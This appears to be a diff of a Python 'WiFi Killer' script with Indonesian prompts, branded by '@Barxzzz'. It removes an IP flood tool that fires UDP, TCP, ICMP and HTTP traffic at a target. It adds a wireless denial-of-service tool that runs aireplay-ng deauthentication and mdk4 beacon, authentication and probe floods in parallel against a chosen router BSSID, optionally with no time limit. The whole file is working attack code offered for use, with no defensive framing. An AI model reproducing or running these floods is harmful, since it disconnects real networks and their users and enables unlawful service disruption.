@@ -2,75 +2,91 @@
 import os
 import time
 import random
-import socket
 import threading
 import subprocess
 
-print("""
-╔═══════════════════════════════════════════╗
-║    WiFi Killer ULTRA SIMPLE v7.0          ║
-║    Made by @Barxzzz                       ║
-║    "100% Work - Guaranteed No Error"      ║
-╚═══════════════════════════════════════════╝
-""")
+G = '\033[92m'
+R = '\033[91m'
+Y = '\033[93m'
+C = '\033[96m'
+W = '\033[0m'
 
-# ===== INPUT =====
-target_ip = input("[?] Target IP: ")
-threads = int(input("[?] Threads (50-200): "))
-duration = int(input("[?] Durasi (detik): "))
+os.system('clear')
 
-# ===== UDP FLOOD (Paling Brutal) =====
-def udp_flood(ip, dur):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end = time.time() + dur
-    while time.time() < end:
-        try:
-            port = random.randint(1, 65535)
-            sock.sendto(os.urandom(65500), (ip, port))
-        except:
-            pass
+banner = f"""
+{C}╔═══════════════════════════════════════════╗
+║   🔥 WiFi KILLER PRO v3 - BARZZ_BOT 🔥    ║
+║        Created by : @Barxzzz               ║
+║        Mode       : Full Destroy           ║
+╚═══════════════════════════════════════════╝{W}
+"""
+print(banner)
 
-# ===== TCP FLOOD =====
-def tcp_flood(ip, dur):
-    end = time.time() + dur
-    while time.time() < end:
-        try:
-            port = random.randint(1, 65535)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.01)
-            s.connect((ip, port))
-            s.send(os.urandom(4096))
-            s.close()
-        except:
-            pass
+# === Input ===
+interface = input(f"{G}[?] Interface monitor (contoh: wlan0mon): {W}") or "wlan0mon"
+bssid = input(f"{G}[?] BSSID router (contoh: 00:11:22:33:44:55): {W}")
+channel = input(f"{G}[?] Channel (1-11): {W}") or "6"
+duration = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)
 
-# ===== ICMP FLOOD (Ping) =====
-def icmp_flood(ip, dur):
-    end = time.time() + dur
-    while time.time() < end:
-        os.system(f"ping -s 65500 -c 1 {ip} > /dev/null 2>&1")
+# === Set channel ===
+os.system(f"sudo iwconfig {interface} channel {channel}")
 
-# ===== HTTP FLOOD (Curl) =====
-def http_flood(ip, dur):
-    end = time.time() + dur
-    while time.time() < end:
-        os.system(f"curl -s -o /dev/null http://{ip} &")
-        os.system(f"curl -s -o /dev/null https://{ip} &")
+# === Fungsi serangan ===
+def deauth_all():
+    while True:
+        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {interface}")
+        time.sleep(0.5)
 
-# ===== MULAI SERANGAN =====
-print(f"\n[⚡] Attacking {target_ip} with {threads} threads...")
-print("[💀] Target will die in seconds!\n")
+def deauth_client():
+    while True:
+        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c ff:ff:ff:ff:ff:ff {interface}")
+        time.sleep(0.5)
 
-for i in range(threads):
-    threading.Thread(target=udp_flood, args=(target_ip, duration), daemon=True).start()
-    threading.Thread(target=tcp_flood, args=(target_ip, duration), daemon=True).start()
-    threading.Thread(target=icmp_flood, args=(target_ip, duration), daemon=True).start()
-    threading.Thread(target=http_flood, args=(target_ip, duration), daemon=True).start()
+def beacon_flood():
+    while True:
+        os.system(f"sudo mdk4 {interface} b -c {channel} -s 1000")
+        time.sleep(1)
 
-# Monitor bandwidth
-start_time = time.time()
-while time.time() - start_time < duration:
-    time.sleep(1)
-    print(f"[📊] Running... {int(duration - (time.time() - start_time))}s remaining", end="\r")
+def auth_dos():
+    while True:
+        os.system(f"sudo mdk4 {interface} a -a {bssid} -s 1000")
+        time.sleep(1)
 
-print("\n\n[✔] ATTACK COMPLETE! Target is down.")
+def probe_flood():
+    while True:
+        os.system(f"sudo mdk4 {interface} p -c {channel} -s 1000")
+        time.sleep(1)
+
+# === Jalankan semua serangan paralel ===
+threads = [
+    threading.Thread(target=deauth_all),
+    threading.Thread(target=deauth_client),
+    threading.Thread(target=beacon_flood),
+    threading.Thread(target=auth_dos),
+    threading.Thread(target=probe_flood)
+]
+
+print(f"\n{G}[+] Target BSSID: {bssid}{W}")
+print(f"{G}[+] Channel: {channel}{W}")
+print(f"{G}[+] Interface: {interface}{W}")
+print(f"{G}[+] Memulai semua serangan...{W}\n")
+
+for t in threads:
+    t.daemon = True
+    t.start()
+
+# === Durasi ===
+if duration > 0:
+    time.sleep(duration)
+    print(f"\n{R}[!] Durasi habis, menghentikan serangan{W}")
+    os.system("pkill -f aireplay-ng")
+    os.system("pkill -f mdk4")
+else:
+    input(f"\n{Y}[!] Tekan ENTER untuk stop{W}")
+    os.system("pkill -f aireplay-ng")
+    os.system("pkill -f mdk4")
+
+print(f"\n{G}═══════════════════════════════════════════{W}")
+print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
+print(f"{R}[✓] Router target kemungkinan sudah mati / restart{W}")
+print(f"{G}═══════════════════════════════════════════{W}")
